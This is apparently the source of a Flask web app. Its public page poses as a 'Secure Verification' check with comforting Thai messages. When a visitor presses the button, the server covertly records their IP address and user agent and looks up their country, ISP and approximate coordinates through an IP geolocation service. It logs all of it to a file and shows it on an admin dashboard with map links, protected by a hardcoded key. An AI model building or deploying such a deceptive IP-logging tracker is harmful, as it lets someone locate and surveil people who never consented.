from flask import Flask, request, jsonify
import os, json, re
from datetime import datetime
import requests

app = Flask(__name__)

ADMIN_KEY = "0949205717As"

# --------- Helpers ---------
MOBILE_RE = re.compile(r"Android|iPhone|iPad|iPod|Mobile", re.I)

def detect_device(ua: str):
    if not ua:
        return "unknown"
    return "mobile" if MOBILE_RE.search(ua) else "desktop"


def calc_reliability(acc, percent, proxy, device):
    score = 0

    if acc <= 20:
        score += 45
    elif acc <= 50:
        score += 35
    elif acc <= 100:
        score += 25
    elif acc <= 200:
        score += 15
    elif acc <= 500:
        score += 8
    else:
        score += 3

    try:
        p = int(percent)
    except:
        p = 0

    score += int(p * 0.3)

    if device == "mobile":
        score += 5

    if str(proxy).lower() == "true":
        score -= 30

    return max(0, min(100, score))


# --------- HOME ---------
@app.route("/")
def home():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Secure Verification</title>
<style>
body{
    margin:0;
    font-family:Arial;
    background:linear-gradient(180deg,#0f0f1f,#000);
    color:white;
    text-align:center;
}
.card{
    margin-top:120px;
    background:rgba(0,0,0,0.6);
    display:inline-block;
    padding:40px;
    border-radius:20px;
    box-shadow:0 0 25px #6c5ce7;
    width:360px;
}
button{
    padding:15px 30px;
    border:none;
    border-radius:10px;
    background:#6c5ce7;
    color:white;
    font-size:18px;
    cursor:pointer;
}
button:hover{background:#a29bfe;}
small{color:#aaa}
</style>
</head>
<body>

<div class="card">
    <h2>🔐 รู้สึกท้อหรอ</h2>
    <p>กดปุ่มเพื่อเริ่มตรวจสอบ</p>

    <button onclick="start()">ยืนยัน</button>

    <p id="status"></p>
    <small>ใจเย็นๆผ่อนคลายเยอะๆ</small>
</div>

<script>
function start(){
    document.getElementById("status").innerText = "กำลังตรวจสอบ...";

    fetch("/location", {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body: JSON.stringify({
            percent: Math.floor(Math.random()*100)
        })
    })
    .then(()=>{
        window.location="/done";
    });
}
</script>

</body>
</html>
"""


# --------- DONE ---------
@app.route("/done")
def done():
    return """
<body style="background:black;color:white;text-align:center;padding:100px">
<h1>✅ ยืนยันเรียบร้อย</h1>
<p>หายท้อแล้วนะอยู่กับตัวเอง</p>
</body>
"""


# --------- API ---------
@app.route("/location", methods=["POST"])
def location():
    d = request.get_json() or {}

    percent = int(d.get("percent", 0))

    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    device = detect_device(ua)

    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    proxy = False
    isp = "Unknown"
    country = "Unknown"

    lat = "0"
    lon = "0"
    acc = 999

    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
        proxy = res.get("proxy", False)
        isp = res.get("isp", "Unknown")
        country = res.get("country", "Unknown")
        lat = res.get("lat", 0)
        lon = res.get("lon", 0)
    except:
        pass

    reliability = calc_reliability(acc, percent, proxy, device)

    with open("log.txt","a") as f:
        f.write(f"{time}|{ip}|{device}|{country}|{isp}|{lat}|{lon}|{acc}|{percent}|{proxy}|{reliability}\n")

    return jsonify({"ok":True})


# --------- ADMIN ---------
@app.route("/admin")
def admin():
    if request.args.get("key") != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""
    data_points = []

    try:
        with open("log.txt") as f:
            for line in f:
                t,ip,device,country,isp,lat,lon,acc,percent,proxy,rel = line.strip().split("|")

                link = f"https://www.google.com/maps?q={lat},{lon}"

                pr = int(percent)
                color = "lime" if pr > 80 else "orange" if pr > 50 else "red"

                rows += f"""
                <tr>
                    <td>{t}</td>
                    <td>{ip}</td>
                    <td>{device}</td>
                    <td>{country}</td>
                    <td>{isp}</td>
                    <td>{lat},{lon}</td>
                    <td>{acc}</td>
                    <td style='color:{color}'>{percent}%</td>
                    <td>{proxy}</td>
                    <td>{rel}</td>
                    <td><a href="{link}" target="_blank">📍</a></td>
                </tr>
                """

                data_points.append({"acc": float(acc), "rel": int(rel)})

    except:
        rows = "<tr><td colspan=11>No data</td></tr>"

    accs = [p["acc"] for p in data_points]
    rels = [p["rel"] for p in data_points]

    return f"""
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Dashboard</title>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body{{background:#0f0f1f;color:white;font-family:Arial}}
table{{width:100%;text-align:center}}
</style>
</head>
<body>

<h1>📊 PRO DASHBOARD</h1>

<canvas id="chart"></canvas>

<script>
const ctx = document.getElementById('chart');

new Chart(ctx, {{
    type: 'line',
    data: {{
        labels: {list(range(len(accs)))},
        datasets: [
            {{ label: 'Accuracy (m)', data: {accs} }},
            {{ label: 'Reliability', data: {rels} }}
        ]
    }}
}});
</script>

<table border=1>
<tr>
<th>Time</th><th>IP</th><th>Device</th><th>Country</th><th>ISP</th>
<th>Location</th><th>Accuracy</th><th>%</th><th>Proxy</th><th>Score</th><th>Map</th>
</tr>

{rows}
</table>

</body>
</html>
"""


# --------- RUN ---------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
